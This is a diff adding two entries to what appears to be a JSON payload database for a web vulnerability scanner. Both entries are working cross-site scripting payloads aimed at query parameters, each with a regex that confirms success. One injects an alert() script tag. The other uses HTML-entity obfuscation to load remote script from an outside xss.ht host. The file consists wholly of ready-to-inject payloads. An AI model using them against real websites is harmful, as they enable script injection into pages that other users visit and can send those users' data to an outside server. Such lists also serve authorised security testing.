@@ -164327,5 +164327,27 @@
       "expected_status_code": 200,
       "success_regex": "<script|onerror|onload|alert\\(|javascript:"
     }
+  },
+  {
+    "payload_id": "OWP-474750",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\\x3e\\x3cscript\\x3ealert(/XSSed-By-Arbin/)\\x3c/script\\x3e\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-474751",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "><script&#32;src&#61;https&#58;&#47;&#47;anubhav1403&#46;xss&#46;ht><&#47;script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
   }
 ]
